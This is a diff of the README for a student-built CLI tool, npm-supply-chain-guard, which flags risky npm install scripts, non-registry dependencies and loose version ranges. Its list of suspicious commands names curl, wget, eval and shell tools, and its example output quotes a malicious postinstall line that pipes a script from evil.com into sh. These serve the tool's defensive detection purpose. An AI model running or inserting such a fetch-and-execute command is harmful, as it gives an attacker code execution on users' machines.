@@ -1,173 +1,115 @@
-npm-supply-chain-guard
-======================
-> 🚀 Detect risky npm dependencies before they compromise your project.
-> A lightweight Node.js CLI tool to detect npm supply-chain security risks.
+# npm-supply-chain-guard
 
---------------------------------------------------
+A small CLI tool I built to catch risky npm dependencies before they end up
+in a project — things like malicious install scripts, tampered packages, or
+dependencies pulled from somewhere other than the registry.
 
-QUICK START
+## Why I built this
 
+Every project pulls in dozens (sometimes hundreds) of third-party packages,
+and most of us never actually look at what those packages do when they
+install. A `postinstall` script can run pretty much anything — curl a file
+from somewhere and pipe it into `bash`, for example — and nobody notices
+until something breaks.
+
+This isn't a replacement for `npm audit` or a full vulnerability scanner.
+It's a static check that flags obviously risky patterns before you even
+run `npm install`.
+
+## What it checks for
+
+- Lifecycle scripts that run automatically (`preinstall`, `install`,
+  `postinstall`, etc.) and what commands they actually run
+- Suspicious commands inside those scripts — `curl`, `wget`, `eval`,
+  `base64`, `chmod`, `powershell`, `bash`, `sh`
+- Dependencies pulled from git URLs or raw http(s) links instead of the
+  npm registry
+- Loose version ranges (`latest`, `*`, `^`, `~`) that let a dependency
+  update itself without you noticing
+- `package-lock.json` — flags remote-resolved packages and anything with
+  an install script
+
+It's dependency-free and runs entirely on your machine — nothing gets
+sent anywhere.
+
+## Install
+
+```bash
 git clone https://github.com/doolamdattatreya2025/npm-supply-chain-guard.git
-
 cd npm-supply-chain-guard
-
 npm install
+```
 
+Optional, if you want it as a global command:
+
+```bash
 npm install -g .
+```
 
-npm-supply-chain-guard .
---------------------------------------------------
+## Usage
 
-WHY THIS PROJECT
+Scan the current directory:
 
-Modern applications depend heavily on third-party packages.
-This introduces supply-chain risks such as:
-
-- Malicious install scripts
-- Tampered dependencies
-- Hidden payloads in nested packages
-
-Even trusted libraries can be compromised.
-
-This tool helps detect risky patterns early — before they become real security incidents.
-
---------------------------------------------------
-
-FEATURES
-
-- Detects risky lifecycle scripts:
-  preinstall, install, postinstall, preuninstall, postuninstall
-
-- Flags suspicious commands:
-  curl, wget, base64, chmod, eval, powershell, bash, sh
-
-- Detects non-registry dependencies:
-  git, http(s), file sources
-
-- Warns about unsafe versioning:
-  latest, *, ^, ~, >
-
-- Analyzes package-lock.json:
-  - Remote resolved packages
-  - Dependencies with install scripts
-
-- Fast, dependency-free CLI tool
-
---------------------------------------------------
-
-SECURITY & PRIVACY
-
-✔ Runs completely locally  
-✔ No data is sent externally  
-✔ No external dependencies  
-
-Note:
-This tool performs static analysis and does not replace full vulnerability scanners like npm audit.
-
---------------------------------------------------
-
-INSTALLATION
-
-git clone https://github.com/doolamdattatreya2025/npm-supply-chain-guard.git
-
-cd npm-supply-chain-guard
-
-npm install
-
-(optional global install)
-npm install -g .
-
---------------------------------------------------
-
-USAGE
-
-Scan current project:
+```bash
 node src/index.js .
+```
 
-Scan another project:
+Scan a different project:
+
+```bash
 node src/index.js /path/to/project
+```
 
-If installed globally:
+Or, if installed globally:
+
+```bash
 npm-supply-chain-guard .
+```
 
---------------------------------------------------
+## Example output
 
-RUN TESTS
+```
+$ npm-supply-chain-guard .
 
+Scanning project: /my-app
+
+[1] Risky lifecycle script: postinstall -> curl http://evil.com/install.sh | sh
+[2] Suspicious command in "postinstall": downloads external content with curl
+[3] Unsafe version tag: lodash@latest
+[4] Wide version range: express@^4.18.2
+[5] Dependency has an install script: node_modules/badpkg
+
+5 warnings found.
+```
+
+## Tests
+
+```bash
 npm test
+```
 
---------------------------------------------------
+## Where I'd like to take this next
 
-DEMO
+Right now it's a local CLI check, which is useful but limited. Things I'm
+considering adding when I get time:
 
-![CLI Demo](./assets/demo.png)
+- Exporting results as SARIF so it can plug into CI/CD
+- Basic typosquatting detection (e.g. catching `expresss` instead of `express`)
+- Digging deeper into nested dependencies instead of just top-level ones
 
---------------------------------------------------
+Not committing to a timeline on these — mostly building this alongside
+coursework, so progress is a bit uneven.
 
-EXAMPLE OUTPUT
+## Contributing
 
-> npm-supply-chain-guard .
+If you spot a bug, a false positive, or a detection pattern I'm missing,
+open an issue or send a PR. Still learning, so feedback is genuinely
+welcome.
 
-PS C:\Users\acer\Desktop\npm-supply-chain-guard\test-vulnerable-project> node ../src/index.js .
+## License
 
-🔍 Scanning: C:\Users\acer\Desktop\npm-supply-chain-guard\test-vulnerable-project
+MIT
 
-⚠ [1] [MEDIUM] Risky lifecycle script: postinstall
+---
 
-⚠ [2] [HIGH] Suspicious command in "postinstall": downloads external content with curl
-
-⚠ [3] [MEDIUM] Suspicious command in "postinstall": contains remote URL
-
-⚠ [4] [LOW] Wide version range detected: lodasht@^4.0.0
-
-⚠ [5] [HIGH] High Risk: "lodasht" looks like a typosquatting attempt of "lodash"
-
-⚠ [6] [MEDIUM] Unsafe version tag: express@latest
-
-⚠ [7] [HIGH] Suspicious dependency source: react@git+https://github.com/hacker/react-clone.git
-
-Total Warnings: 7
-
---------------------------------------------------
-
-WHAT IT DETECTS
-
-- Supply-chain attack indicators
-- Malicious install-time execution
-- Suspicious dependency sources
-- Unsafe version constraints
-- Risky nested dependency behavior
-
---------------------------------------------------
-
-ROADMAP
-
-- SARIF report export (CI/CD integration)
-- GitHub security integration
-- Typosquatting detection
-- Deep dependency analysis
-- Web dashboard
-
---------------------------------------------------
-
-CONTRIBUTING
-
-Contributions are welcome.
-
-If you find a bug or security issue:
-- Open an issue
-- Or submit a pull request
-
---------------------------------------------------
-
-LICENSE
-
-MIT License
-
---------------------------------------------------
-
-AUTHOR
-
-DATTATREYA
-Cybersecurity Student
-GitHub: https://github.com/doolamdattatreya2025
+Built by [Dattatreya](https://github.com/doolamdattatreya2025) — cybersecurity student, still figuring a lot of this out.
